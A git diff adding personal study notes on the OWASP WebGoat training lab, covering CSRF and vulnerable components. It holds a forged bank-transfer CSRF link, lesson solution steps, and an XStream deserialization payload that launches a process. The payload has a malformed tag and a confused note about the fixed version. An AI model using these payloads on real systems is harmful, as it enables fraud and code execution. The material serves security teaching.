@@ -1,6 +1,14 @@
 # web goat
 owasp demo site
 
+* Introduction webwolf
+
+```
+http://localhost:8080/WebGoat/start.mvc#lesson/WebWolfIntroduction.lesson/2
+there is a open issue :
+https://github.com/WebGoat/WebGoat/issues/403
+```
+
 # installation
 
 * download from git:
@@ -391,8 +399,115 @@ just intercept the request then edit the total, and quantity the forward request
 attack forces an authenticated user(victim) to send a forged http request, including the victim's session cookie to a vulnerable web application
 which allows the attacker to force the victim's browser to generate request such that the vulnerable app perceives as legitimate from the victim
 
+CSRF commonly has the following characteristics:
+  * it involves sites that rely on a user's identity
+  * it exploits the site's trust in that identity
+  * it tricks the user's browser into sending Http requests to a target site.
+  * it involves HTTP requests that have side effects.
+
+The most simple CSRF to perform:
+```
+<a href="http://bank.com/transfer?account_number_from=123456789&account_number_to=987654321&amount=100000">View my Pictures!</a>
+```
+In most cases the website might have multiple controls to approve the request.
+
+### Techniques:
 * session hijacking and cross-site request
 
+### Practices
+```
+1. Basic get CSRF exercise
+http://localhost:8080/WebGoat/start.mvc#lesson/CSRF.lesson/2
+step 1: click submit query then copy link : `http://localhost:8080/WebGoat/csrf/basic-get-flag?csrf=true&ubmit%3D=Submit` and save page as static html
+step 2: copy the link above into action parameter of the form then open static page in the another tab within the same browser.
+step 3: It will return the json value as below:
+  {
+    flag: 23768,
+    success: true,
+    message: "Congratulations! Appears you made the request from your local machine."
+  }
+step 4: input into the confirm flag value then click submit
+
+2. post a review
+http://localhost:8080/WebGoat/start.mvc#lesson/CSRF.lesson/3
+
+step 1: save a copy of source
+step 2: edit the action with the link  action="http://localhost:8080/WebGoat/csrf/review"
+step 3: open the saved source in the new tab with the same browser
+step 4: click submit, the result will be as below:
+{
+lessonCompleted: true,
+feedback: "It appears you have submitted correctly from another site. Go reload and see if your post is there.",
+output: null
+}
+```
+
+## Vulnerable components - A9
+
+https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities
+https://www.youtube.com/watch?v=bhJmVBJ-F-4
+
+The opensource community is maturing and the availability of open source software has become prolific without
+regard to determining the provenance of the libraries used in our applications.
+
+### questions we should know the answer too:
+
+* How do we know what open source components are in our applications?
+    * how do we know what versions of open source components we are using?
+* How do we define the risk of open source components ?
+* How do we discover the risk of open source components?
+    * How do we associate a specific risk to a specific version of an open source component?
+* How do we know when a component releases a new version?
+* How do we know if a new vulnerability is found on what was previously a "good" component?
+* How do we know if we are using the authentic version of an open source component?
+
+### Tools
+
+* dependency check :
+https://github.com/jeremylong/DependencyCheck
+
+### Practices
+
+```
+http://localhost:8080/WebGoat/start.mvc#lesson/VulnerableComponents.lesson/11
+step 1: try to input
+XStream.fromXML(<contact>
+    <id>1</id>
+    <firstName>Bruce</firstName>
+    <lastName>Mayhew</lastName>
+    <email>webgoat@owasp.org</email>
+</contact>)
+
+Identify the internal error 500: com.thoughtworks.xstream.io.StreamException
+xstream-1.4.7.jar
+
+step 2: identify xstream vunelrability
+http://x-stream.github.io/CVE-2013-7285.html
+
+step 3:
+Input to check issues:
+<contact>
+  <dynamic-proxy>
+    <interface>org.company.model.Contact</interface>
+    <handler class='java.beans.EventHandler'>
+      <target class='java.lang.ProcessBuilder'>
+        <command>
+          <string>calc.exe</string>
+        </command>
+      </target>
+      <action>start</action>
+    <handler>
+  </dynamic-proxy>
+</contact>
+
+This issue was fixed with xtream >= 1.4.7
+```
+
+### Mitigations
+
+* Generate an OSS Bill Of material
+* Baseline open source consumption in your projects
+* Develop an open source component risk management strategy to mitigate current risk and reduce futre risk
 
 ## refrences
 
